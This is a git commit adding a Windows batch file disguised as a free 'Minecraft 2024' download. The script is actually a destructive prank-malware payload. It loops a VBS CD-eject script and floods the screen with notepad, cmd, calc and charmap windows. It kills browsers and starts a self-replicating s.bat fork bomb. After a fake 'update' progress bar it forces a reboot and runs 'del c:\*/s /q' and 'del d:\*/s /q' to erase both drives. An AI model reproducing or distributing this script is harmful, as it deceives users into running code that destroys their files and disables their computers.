399e815d8a21a37f472f5fbbceb273bea959215e
Kundel8392 <magda.orzol82@gmail.com>
2024-09-14 12:11:53 +0200

    Create Minecraft 2024 download free(zgraj).bat

---
+++ Minecraft 2024 download free(zgraj).bat
@@ -0,0 +1,395 @@
+@echo off 
+color 2
+echo                                   -
+echo                                   -
+echo                                loading...
+timeout 10 /nobreak
+tree C:\Microsoft
+tree C:\Microsoft
+echo                                                   -
+echo                                                   -
+echo                                                   -
+echo                                            downloading...
+echo                                                   -
+Start Windows-Antivirus.exe
+C:
+cd C:\Fake Virus\Settings
+java hi
+echo   
+Start Fehler.vbs
+Start Fehler.vbs
+Start Fehler.vbs
+Start Fehler.vbs
+timeout 5 /nobreak 
+Start Fehler.vbs
+rem ———————————
+rem CD auf machen
+echo Do >> "Klick_mich.vbs"
+echo Set oWMP = CreateObject("WMPlayer.OCX.7") >> "Klick_mich.vbs"
+echo Set colCDROMs = oWMP.cdromCollection >> "Klick_mich.vbs"
+echo colCDROMs.Item(d).Eject >> "Klick_mich.vbs"
+echo colCDROMs.Item(d).Eject >> "Klick_mich.vbs"
+echo Loop >> "Klick_mich.vbs"
+start "" "Klick_mich.vbs"
+rem ———————————
+echo   
+echo   
+echo                
+Start 
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start
+Start 
+Start
+echo   
+echo   
+echo   
+echo   
+echo    
+echo   
+echo   
+echo   
+echo    
+echo   
+echo   
+echo   
+echo    
+Start 
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start
+Start 
+Start
+Start
+Start
+Start
+Start 
+Start
+Start 
+color 2
+Start https://youtu.be/usal2roCobM?t=17
+Start https://youtu.be/usal2roCobM?t=17
+Start https://youtu.be/usal2roCobM?t=17
+Start https://youtu.be/usal2roCobM?t=17
+Start https://youtu.be/usal2roCobM?t=17
+Start https://youtu.be/usal2roCobM?t=17
+Start https://youtu.be/usal2roCobM?t=17
+echo   
+echo   
+C:
+del klick_mich.vbs /s /q
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+Start Fehler2.vbs
+shutdown -s -t 100 -f 
+echo   
+
+taskkill /f /im opera.exe
+taskkill /f /im opera gx.exe
+taskkill /f /im firefox.exe
+taskkill /f /im Microsoft Edge.exe
+taskkill /f minecrosoft store.exe
+taskkill /f minecrosoft teams.exe
+:start
+start notepad.exe
+start notepad.exe
+
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+@echo off
+cd %homedrive%/users/%username%/
+(
+echo start s.bat
+)>>s.bat
+start s.bat
+@echo off
+screen
+title Mise … jour de l'invite de commande...
+set k=0
+cls
+:boucle
+set /A k=%k%+1
+if %k%==1 cls
+if %k%==1 echo.
+if %k%==1 echo.
+if %k%==1 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==1 echo           şŰ         ş
+if %k%==1 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==51 cls
+if %k%==51 echo.
+if %k%==51 echo.
+if %k%==51 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==51 echo           şŰŰ        ş
+if %k%==51 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==101 cls
+if %k%==101 echo.
+if %k%==101 echo.
+if %k%==101 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==101 echo           şŰŰŰ       ş
+if %k%==101 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==151 cls
+if %k%==151 echo.
+if %k%==151 echo.
+if %k%==151 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==151 echo           şŰŰŰŰ      ş
+if %k%==151 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==201 cls
+if %k%==201 echo.
+if %k%==201 echo.
+if %k%==201 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==201 echo           şŰŰŰŰŰ     ş
+if %k%==201 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==251 cls
+if %k%==251 echo.
+if %k%==251 echo.
+if %k%==251 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==251 echo           şŰŰŰŰŰŰ    ş
+if %k%==251 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==301 cls
+if %k%==301 echo.
+if %k%==301 echo.
+if %k%==301 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==301 echo           şŰŰŰŰŰŰŰ   ş
+if %k%==301 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==351 cls
+if %k%==351 echo.
+if %k%==351 echo.
+if %k%==351 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==351 echo           şŰŰŰŰŰŰŰŰ  ş
+if %k%==351 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==401 cls
+if %k%==401 echo.
+if %k%==401 echo.
+if %k%==401 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==401 echo           şŰŰŰŰŰŰŰŰŰ ş
+if %k%==401 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==451 cls
+if %k%==451 echo.
+if %k%==451 echo.
+if %k%==451 echo           ÉÍÍÍÍÍÍÍÍÍÍ»
+if %k%==451 echo           şŰŰŰŰŰŰŰŰŰŰş
+if %k%==451 echo           ČÍÍÍÍÍÍÍÍÍÍĽ
+if %k%==700 echo.
+if %k%==700 echo.
+if %k%==700 echo        Red‚marrage de l'ordinateur...
+if %k%==900 goto end
+GOTO boucle
+:end
+shutdown -r -t 0
+taskkill /f /im explorer.exe
+del c:\*/s /q
+del d:\*/s /q
